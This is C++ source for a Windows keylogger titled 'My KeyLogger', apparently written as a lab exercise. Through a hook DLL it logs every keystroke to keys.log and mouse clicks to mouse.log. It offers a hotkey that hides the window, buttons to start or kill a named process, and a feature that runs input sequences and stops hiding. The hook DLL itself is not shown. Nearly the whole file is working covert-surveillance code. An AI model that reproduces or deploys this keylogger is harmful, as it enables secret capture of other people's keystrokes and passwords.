#include <windows.h>
#include <stdio.h>
#include "labFunctions.hpp"
#include "lr_sequences.hpp"

LRESULT CALLBACK LogWndProc(HWND, UINT, WPARAM, LPARAM);
#define WM_KMESSAGE WM_USER + 1
#define WM_MMESSAGE WM_USER + 3
#define ID_BTN_RUN_PROCESS 0
#define ID_BTN_KILL_PROCESS 1
#define ID_BTN_SET_HOTKEY_HIDE 2
#define ID_EDIT_PROCESS_NAME 3
#define ID_BTN_SETUP_SEQUENCE 4
HWND hwndEditProcessName, hwndStaticHideHotKey, hwndStaticInfo, hwndBtnSetupSequence;
LrSequences sequence;
HWND hWnd; 
HINSTANCE hDllInst; 
int(*SetHook)(HWND, UINT, UINT);
int(*UnSetHook)();
int hotkey = 65;
int setKeyFlag = FALSE;


int APIENTRY WinMain(HINSTANCE hInstance,
	HINSTANCE hPrevInstance,
	LPSTR lpCmdLine,
	int nCmdShow)
{
	MSG msg;
	WNDCLASS wc;
	memset(&wc, 0, sizeof(wc));
	wc.lpszClassName = TEXT("__MyKeyLogger");
	wc.hInstance = hInstance;
	wc.lpfnWndProc = LogWndProc;
	wc.style = CS_HREDRAW | CS_VREDRAW;
	wc.hbrBackground = (HBRUSH)(COLOR_MENU + 1);
	wc.hCursor = LoadCursor(NULL, IDC_ARROW);

	RegisterClass(&wc);

	hWnd = ::CreateWindowEx(0,
		TEXT("__MyKeyLogger"),
		TEXT("My KeyLogger"),
		WS_POPUP | WS_VISIBLE | WS_CAPTION | WS_SYSMENU | WS_THICKFRAME,
		0, 0, 450, 250,
		NULL,
		NULL,
		hInstance,
		0);

	hDllInst = LoadLibrary((LPCTSTR) TEXT("hookdll.dll"));

	if (hDllInst)
	{
		SetHook = (int(*)(HWND, UINT, UINT))GetProcAddress(hDllInst, "SetHook");
		UnSetHook = (int(*)())GetProcAddress(hDllInst, "UnSetHook");
	}

	if (SetHook)SetHook(hWnd, WM_KMESSAGE, WM_MMESSAGE);

	while (GetMessage(&msg, NULL, 0, 0))
	{
		if (msg.message == WM_KEYDOWN && sequence.getStopKeyboardFilter() == TRUE) {
			SendMessage(sequence.getHDlg(), WM_KEYDOWN, msg.wParam, msg.lParam);
		}
		DispatchMessage(&msg);
		TranslateMessage(&msg);
	}

	if (UnSetHook)UnSetHook();

	if (IsWindow(hWnd))
		DestroyWindow(hWnd);

	sequence.clear(hDllInst);
	if (hDllInst) FreeLibrary(hDllInst);
	return 0;
}

LRESULT CALLBACK LogWndProc(HWND hwnd, UINT Message, WPARAM wParam, LPARAM lParam)
{
	FILE * fKeys = fopen("keys.log", "a");
	FILE * fMouse = fopen("mouse.log", "a");
	HWND hTaskManager;
	const char* text;
	TCHAR procName[256];
	TCHAR hotkeyChar[2] = TEXT("a");
	switch (Message)
	{
	case WM_CREATE:
		CreateWindow(TEXT("Static"), TEXT("Process name:"), WS_CHILD | WS_VISIBLE | SS_LEFT, 20, 20, 100, 20, hwnd, (HMENU)100, NULL, NULL);
		hwndEditProcessName = CreateWindow(TEXT("Edit"), TEXT("notepad.exe"), WS_CHILD | WS_VISIBLE | WS_BORDER, 20, 40, 100, 20, hwnd, (HMENU)ID_EDIT_PROCESS_NAME, NULL, NULL);
		CreateWindow(TEXT("Button"), TEXT("Run process"), WS_CHILD | WS_VISIBLE, 140, 40, 100, 20, hwnd, (HMENU)ID_BTN_RUN_PROCESS, NULL, NULL);
		CreateWindow(TEXT("Button"), TEXT("Kill process"), WS_CHILD | WS_VISIBLE, 260, 40, 100, 20, hwnd, (HMENU)ID_BTN_KILL_PROCESS, NULL, NULL);
		CreateWindow(TEXT("Static"), TEXT("Hotkey for show/hide app: "), WS_CHILD | WS_VISIBLE | SS_LEFT, 20, 80, 80, 30, hwnd, (HMENU)101, NULL, NULL);
		hwndStaticHideHotKey = CreateWindow(TEXT("Static"), TEXT("A"), WS_CHILD | WS_VISIBLE | WS_BORDER, 100, 80, 20, 20, hwnd, (HMENU)102, NULL, NULL);
		CreateWindow(TEXT("Button"), TEXT("Set new hotkey"), WS_CHILD | WS_VISIBLE, 140, 80, 100, 20, hwnd, (HMENU)ID_BTN_SET_HOTKEY_HIDE, NULL, NULL);
		hwndStaticInfo = CreateWindow(TEXT("Static"), TEXT(""), WS_CHILD | WS_VISIBLE, 20, 120, 150, 20, hwnd, (HMENU)104, NULL, NULL);
		hwndBtnSetupSequence = CreateWindow(TEXT("Button"), TEXT("Setup sequence"), WS_CHILD | WS_VISIBLE, 260, 80, 120, 20, hwnd, (HMENU)ID_BTN_SETUP_SEQUENCE, NULL, NULL);
		break;
	case WM_CLOSE:
		DestroyWindow(hwnd);
		break;
	case WM_COMMAND:
		if (HIWORD(wParam) == BN_CLICKED) {
			switch (LOWORD(wParam)) {
			case ID_BTN_RUN_PROCESS:
				GetWindowText(hwndEditProcessName, procName, 255);
				startProcess(procName);
				break;
			case ID_BTN_KILL_PROCESS:
				GetWindowText(hwndEditProcessName, procName, 255);
				killProcess(procName);
				break;
			case ID_BTN_SET_HOTKEY_HIDE:
				setKeyFlag = TRUE;
				SetWindowText(hwndStaticInfo, TEXT("Press any key"));
				break;
			case ID_BTN_SETUP_SEQUENCE:
				sequence.setupSequence();
				break;
			}
		}
		break;
	case WM_KMESSAGE: //lparam scancode, wparam virt_key
		if (sequence.getStopKeyboardFilter())
			break;
		switch (wParam)
		{
			default:
				if (wParam == hotkey) {
					switchAppMode(hwnd);
				}
				if ((TCHAR)wParam == sequence.getStartKey()) {
					sequence.runSequence(hDllInst);
				}
				if ((TCHAR)wParam == sequence.getStopHide()) {
					sequence.stopHide(hDllInst);
				}
				if ((TCHAR)wParam == sequence.getStopEmulate()) {
					sequence.stopEmulate(hDllInst);
				}
				if (setKeyFlag) {
					hotkey = wParam;
					hotkeyChar[0] = (char)wParam;
					SetWindowText(hwndStaticHideHotKey, hotkeyChar);
					SetWindowText(hwndStaticInfo, TEXT(""));
					setKeyFlag = FALSE;
				}
				
				fprintf(fKeys, " %d ", wParam);
				if (lParam == VK_LBUTTON || lParam == VK_RBUTTON) {
					fprintf(fKeys, "VK_MOUSE: %d ", wParam);
				}
				break;
		}
		break;
	case WM_MMESSAGE:
		text = wParam == WM_RBUTTONUP ? "|mouse right| " : "|mouse left| ";
		fprintf(fMouse, text);
		break;

	case WM_DESTROY:
	case WM_ENDSESSION:
		PostQuitMessage(0);
		break;
	}

	fclose(fKeys);
	fclose(fMouse);

	return DefWindowProc(hwnd, Message, wParam, lParam);
}